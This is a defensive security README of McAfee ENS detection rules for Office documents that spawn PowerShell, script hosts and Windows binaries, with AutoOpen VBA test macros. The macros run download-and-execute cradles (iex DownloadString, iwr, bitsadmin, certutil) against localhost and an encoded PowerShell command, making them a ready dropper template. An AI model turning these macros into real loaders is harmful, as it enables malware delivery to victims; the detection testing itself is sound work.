# T1059 - Command and String Interpreter

Malicious MS Office documents may attempt to launch PowerShell through embedded VBA code to execute PowerShell commands.  

**NOTES:**

- Each rule has been tested in a "clean" lab environment but will need to be tweaked for production environmentental factors

- Tests include both the MS Office VBA code and a MS Office file for testing.  If you don't trust my files create a new MS Office macro file with the provided VBA code.

- McAfee ENS should fire a new alert for each test.  Some files include mulitple tests but will be separated by a MessageBox popup telling you what is being tested, along with an added timer pause during execution.

  

## 1. MS Office Launching PowerShell DownloadString / DownloadFile

**Description:**  VBA-enabled MS Office files are regularly leveraged to by adversaries to use PowerShell to download malicious code to execute the second stage of the attack.  

**MITRE ATT&CK Technique:** T1059.001

```jsx
Rule {
	Initiator {
		Match PROCESS {
			#MS Word 
			Include DESCRIPTION {-v "Microsoft Word"}
			#MS Excel
			Include DESCRIPTION {-v "Microsoft Excel"}
			#MS PowerPoint
			Include DESCRIPTION {-v "Microsoft PowerPoint"}
			#MS Outlook
			Include DESCRIPTION {-v "Microsoft Outlook"}
			
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Corporation"} 
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Windows"}



		}
	}
	Target {
		Match PROCESS {
			Include -access "CREATE"
			Include DESCRIPTION {-v "Windows PowerShell"}
			Include DESCRIPTION {-v "Windows PowerShell ISE"}
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Corporation"} 
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Windows"}
 
			Include PROCESS_CMD_LINE {-v "*DownloadString*"}
			Include PROCESS_CMD_LINE {-v "*DownloadFile*"}
			Include PROCESS_CMD_LINE {-v "*DownloadData*"}
			Include PROCESS_CMD_LINE {-v "*iwr*"}
     			Include PROCESS_CMD_LINE {-v "*invoke-webrequest*"}
		}
	}
}
```

**Trigger(s):**

1. MS Office application launched
2. MS Office application launches PowerShell process.
3. PowerShell attempts to download remote data.

## 2.  MS Office Launching Encoded PowerShell

**Description:**  VBA-enabled MS Office files may attempt to launch base64-encoded content by PowerShell to avoid AV detections and obscure intent.

**MITRE ATT&CK Technique:** T1059.001

```jsx
Rule {
	Initiator {
		Match PROCESS {
			#MS Word 
			Include DESCRIPTION {-v "Microsoft Word"}
			#MS Excel
			Include DESCRIPTION {-v "Microsoft Excel"}
			#MS PowerPoint
			Include DESCRIPTION {-v "Microsoft PowerPoint"}
			#MS Outlook
			Include DESCRIPTION {-v "Microsoft Outlook"}
			
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Corporation"} 
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Windows"}


		}
	}
	Target {
		Match PROCESS {
			Include -access "CREATE"
			Include DESCRIPTION {-v "Windows PowerShell"}
			Include DESCRIPTION {-v "Windows PowerShell ISE"}
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Corporation"} 
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Windows"}
			Include PROCESS_CMD_LINE {-v "*-encode*"}
		}
	}
}
```

**Trigger(s):**

1. MS Office application launched
2. MS Office application launches PowerShell process.
3. PowerShell attempts to run encoded commands.



#### **TEST Files - Covers #1 and #2:**

[T1059.001-MS Word.docm](Test%20Files/T1059.001-MS_Word.docm)

[T1059.001-MS Excel.xlsm](Test%20Files/T1059.001-MS_Excel.xlsm)

[T1059.001-MS PowerPoint.pptm](Test%20Files/T1059.001-MS%20PowerPoint.pptm)

**Test VBA Code:**

```jsx
Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal Milliseconds As LongPtr)

Public Sub AutoOpen()

    Dim objWshell1 As Object
    Set objWshell1 = CreateObject("WScript.Shell")
    Dim psString As String
    
    '1 - VBA Launching PowerShell DownloadString
    psString = "powershell.exe -ExecutionPolicy Bypass -nologo -Command iex (New-Object Net.WebClient).DownloadString('http://127.0.0.1/NOTHING');"
    MsgBox ("1 - VBA Launching PowerShell DownloadString" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.001" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
    Sleep (3000)
    
    '2 - VBA Launching PowerShell DownloadFile
     psString = "powershell.exe -ExecutionPolicy Bypass -nologo -Command iex (New-Object Net.WebClient).DownloadFile('http://127.0.0.1/NOTHING');"
    MsgBox ("2 - VBA Launching PowerShell DownloadFile" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.001" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
    Sleep (3000)
   
   '3 - VBA Launching PowerShell DownloadData
     psString = "powershell.exe -ExecutionPolicy Bypass -nologo -Command iex (New-Object Net.WebClient).DownloadData('http://127.0.0.1/NOTHING');"
    MsgBox ("3 - VBA Launching PowerShell DownloadData" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.001" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
    Sleep (3000)
    
    '4 - VBA Launching PowerShell Invoke-WebRequest #1
     psString = "powershell.exe -ExecutionPolicy Bypass -nologo -Command iex (iwr -uri http://127.0.0.1 -outfile c:\\windows\\temp\\test);"
    MsgBox ("3 - VBA Launching PowerShell Invoke-WebRequest #1" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.001" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
   
    Sleep (3000)
    '5 - VBA Launching PowerShell Invoke-WebRequest #2
   
    psString = "powershell.exe -ExecutionPolicy Bypass -nologo -Command iex (invoke-webrequest -uri http://127.0.0.1 -outfile c:\\windows\\temp\\test);"
    MsgBox ("3 - VBA Launching PowerShell Invoke-WebRequest #2" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.001" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
    Sleep (3000)

    '6 - VBA Launching PowerShell Encoded Command
    psString = "powershell.exe -EncodedCommand ZQBjAGgAbwAgACIASABpACAAVABoAGUAcgBlACEAIgA="
    MsgBox ("3 - VBA Launching PowerShell Encoded Command" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.001" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
    Sleep (5000)

End Sub
```

## 3. MS Office Launching Scripts Directly Through cscript/wscript

**Description:**  VBA-enabled MS Office files may attempt to launch JavaScript and VBScript directly.

**MITRE ATT&CK Technique:** T1059.005, T1059.007

```jsx
Rule {
	Initiator {
		Match PROCESS {
			#MS Word 
			Include DESCRIPTION {-v "Microsoft Word"}
			#MS Excel
			Include DESCRIPTION {-v "Microsoft Excel"}
			#MS PowerPoint
			Include DESCRIPTION {-v "Microsoft PowerPoint"}
			#MS Outlook
			Include DESCRIPTION {-v "Microsoft Outlook"}
			
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Corporation"} 
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Windows"}

		}
	}
	Target {
		Match PROCESS {
      Include -access "CREATE"
			# wscript.exe
			Include DESCRIPTION {-v "Microsoft ® Console Based Script Host"}
			#cscript.exe
			Include DESCRIPTION {-v "Microsoft ® Windows Based Script Host"}
			Microsoft ® Console Based Script Host
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Corporation"} 
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Windows"}
 
		}
	}
}

```

**Trigger(s):**

1. MS Office application launched
2. MS Office application launches PowerShell process.
3. PowerShell attempts to run encoded commands.

**Test VBA Code:**

```jsx
 Public Sub AutoOpen()
    Dim objWshell1 As Object
    Set objWshell1 = CreateObject("WScript.Shell")
    Dim psString As String
    
    '1 - VBA Launching VBScript via cscript
    psString = "cmd.exe /c echo MsgBox(""Successfully Executed VBS via CSCRIPT"") >c:\\windows\\temp\\test.vbs "
    objWshell1.Exec (psString)
    psString = "cscript.exe c:\\windows\\temp\\test.vbs"
        
    MsgBox ("1 - VBA Launching VBScript via cscript" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.007/009" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)

     '2 - VBA Launching VBScript via wscript
    psString = "cmd.exe /c echo MsgBox(""Successfully Executed VBS via WSCRIPT"") >c:\\windows\\temp\\test.vbs "
    objWshell1.Exec (psString)
    psString = "wscript.exe c:\\windows\\temp\\test.vbs"
    MsgBox ("2 - VBA Launching VBScript via wscript" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.007/009" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
        
End Sub

```



## 4. MS Office Launching Scripts through CMD or PowerShell then cscript/wscript



**Description:**  VBA-enabled MS Office files may attempt to launch JavaScript and VBScript directly.

**MITRE ATT&CK Technique:** T1059.005, T1059.007

```jsx
Rule {
	Initiator {
		Match PROCESS {
			#MS Word 
			Include DESCRIPTION {-v "Microsoft Word"}
			#MS Excel
			Include DESCRIPTION {-v "Microsoft Excel"}
			#MS PowerPoint
			Include DESCRIPTION {-v "Microsoft PowerPoint"}
			#MS Outlook
			Include DESCRIPTION {-v "Microsoft Outlook"}
			
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Corporation"} 
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Windows"}
		}
	}
	Target {
		Match PROCESS {
      Include -access "CREATE"
			#cmd.exe
			Include DESCRIPTION {-v "Windows Command Processor"}
			#powershell
			Include DESCRIPTION {-v "Windows PowerShell"}
			Include DESCRIPTION {-v "Windows PowerShell ISE"}
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Corporation"} 
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Windows"}
			
		}
		Next_Process_Behavior {
			Target {
				Match PROCESS {
					Include -access "CREATE"

					# wscript.exe
					Include DESCRIPTION {-v "Microsoft ® Console Based Script Host"}
					#cscript.exe
					Include DESCRIPTION {-v "Microsoft ® Windows Based Script Host"}
					Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Corporation"} 
					Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Windows"}

				}
			}
		}
	}
}
```

**Trigger(s):**

1. MS Office application launched
2. MS Office application launches PowerShell or CMD process.
3. Script is launched through cscript.exe or wscript.exe

**Test VBA Code:**

```jsx
 Public Sub AutoOpen()
    Dim objWshell1 As Object
    Set objWshell1 = CreateObject("WScript.Shell")
    Dim psString As String
    
    '1 - VBA Launching VBScript via cscript
    psString = "cmd.exe /c echo MsgBox(""Successfully Executed VBS via CSCRIPT"") >c:\\windows\\temp\\test.vbs "
    objWshell1.Exec (psString)
    psString = "cscript.exe c:\\windows\\temp\\test.vbs"
        
    MsgBox ("1 - VBA Launching VBScript via cscript" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.007/009" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)

     '2 - VBA Launching VBScript via wscript
    psString = "cmd.exe /c echo MsgBox(""Successfully Executed VBS via WSCRIPT"") >c:\\windows\\temp\\test.vbs "
    objWshell1.Exec (psString)
    psString = "wscript.exe c:\\windows\\temp\\test.vbs"
    MsgBox ("2 - VBA Launching VBScript via wscript" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.007/009" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
    
    '3 - VBA Launching VBScript then cmd.exe and then wscript
    psString = "cmd.exe /c echo MsgBox(""Successfully Executed CMD.exe and then VBS via WSCRIPT"") >c:\\windows\\temp\\test.vbs "
    objWshell1.Exec (psString)
    psString = "cmd.exe /c wscript.exe c:\\windows\\temp\\test.vbs"
    MsgBox ("3 - VBA Launching VBScript then cmd.exe and then wscript" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.007/009" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
    
    '4 - VBA Launching VBScript then cmd.exe and then cscript
    psString = "cmd.exe /c echo MsgBox(""Successfully Executed CMD.exe and then VBS via WSCRIPT"") >c:\\windows\\temp\\test.vbs "
    objWshell1.Exec (psString)
    psString = "cmd.exe /c cscript.exe c:\\windows\\temp\\test.vbs"
    MsgBox ("4 - VBA Launching VBScript then cmd.exe and then cscript" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.007/009" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
    
    '5 - VBA Launching VBScript then powershell.exe and then cscript
    psString = "cmd.exe /c echo MsgBox(""Successfully Executed CMD.exe and then VBS via WSCRIPT"") >c:\\windows\\temp\\test.vbs "
    objWshell1.Exec (psString)
    psString = "powershell.exe -c cscript.exe c:\\windows\\temp\\test.vbs"
    MsgBox ("5 - VBA Launching VBScript then powershell.exe and then cscript" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.007/009" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
    
     '6 - VBA Launching VBScript then powershell.exe and then wscript
    psString = "cmd.exe /c echo MsgBox(""Successfully Executed CMD.exe and then VBS via WSCRIPT"") >c:\\windows\\temp\\test.vbs "
    objWshell1.Exec (psString)
    psString = "powershell.exe -c wscript.exe c:\\windows\\temp\\test.vbs"
    MsgBox ("6 - VBA Launching VBScript then powershell.exe and then wscript" + Chr(13) & Chr(10) + "MITRE ATT&CK: T1059.007/009" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10))
    objWshell1.Exec (psString)
        
End Sub



```





#### TEST Files - Covers #3 and #4

[T1059.007-T1059.009-MS_Excel.xlsm](Test%20Files/T1059.007-T1059.009-MS_Excel.xlsm)

[T1059.007-T1059.009-MS_Word.docm](Test%20Files/T1059.007-T1059.009-MS_Word.docm)




## 5. MS Office Launching Other Binaries For Malicious Execution, Persistence or Others Means.



**Description:**  VBA-enabled MS Office files may attempt to use Windows binaries for execution or persistence.

**MITRE ATT&CK Technique:** T1055-T1546-T1105

```jsx
Rule {
	Initiator {
		Match PROCESS {
			#MS Word 
			Include DESCRIPTION {-v "Microsoft Word"}
			#MS Excel
			Include DESCRIPTION {-v "Microsoft Excel"}
			#MS PowerPoint
			Include DESCRIPTION {-v "Microsoft PowerPoint"}
			#MS Outlook
			Include DESCRIPTION {-v "Microsoft Outlook"}
			
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Corporation"} 
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Windows"}
		}
	}
	Target {
		Match PROCESS {
      Include -access "CREATE"
			#rundll32.exe
			Include DESCRIPTION {-v "Windows host process (Rundll32)"}
			#dllhost.exe
			Include DESCRIPTION {-v "COM Surrogate"}

			#bitsadmin.exe
			Include DESCRIPTION {-v "BITS administration utility"}
			
			#CertUtil.exe
			Include DESCRIPTION {-v "certutil.exe"}
			
			#csc.exe
			Include DESCRIPTION {-v "Visual C# Command Line Compiler"}
		
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Corporation"} 
			Include CERT_NAME_CHAINED {-v "C=US, S=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Windows"}
			
		}
		
	}
		
	
}
```
Test VBA Code
```
Public Sub AutoOpen()
    Dim objWshell1 As Object
    Set objWshell1 = CreateObject("WScript.Shell")
    Dim psString As String
    
    '1 - VBA Launching VBScript via cscript
    psString = "rundll32.exe fakedll.dll,Main"
        
    MsgBox ("1 - Rundll32.exe " + Chr(13) & Chr(10) + "MITRE ATT&CK: T1055.001" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10) + "NOTE: you will see an error!")
    objWshell1.Exec (psString)

  '2 - VBA Launching dllhost.exe
    psString = "dllhost.exe /Proccessid:fake"
        
    MsgBox ("2 - Dllhost.exe " + Chr(13) & Chr(10) + "MITRE ATT&CK: T1546.015" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10) + "NOTE: you will see an error!")
    objWshell1.Exec (psString)


  '3 - VBA Launching svchost.exe for execution
    psString = "bitsadmin /create 1 bitsadmin /addfile 1 http://127.0.0.1/test c:\windows\temp\test /complete 1"
        
    MsgBox ("3 - bitsadmin.exe " + Chr(13) & Chr(10) + "MITRE ATT&CK: T1105 " + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10) + "NOTE: you will see an error!")
    objWshell1.Exec (psString)
    

  '4 - VBA Launching certutil.exe for execution
    psString = "certutil.exe -urlcache -split -f http:/127.0.0.1/file file.exe"
        
    MsgBox ("4 - certutil " + Chr(13) & Chr(10) + "MITRE ATT&CK: T1105 " + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10) + "NOTE: you will see an error!")
    objWshell1.Exec (psString)
    
End Sub

```
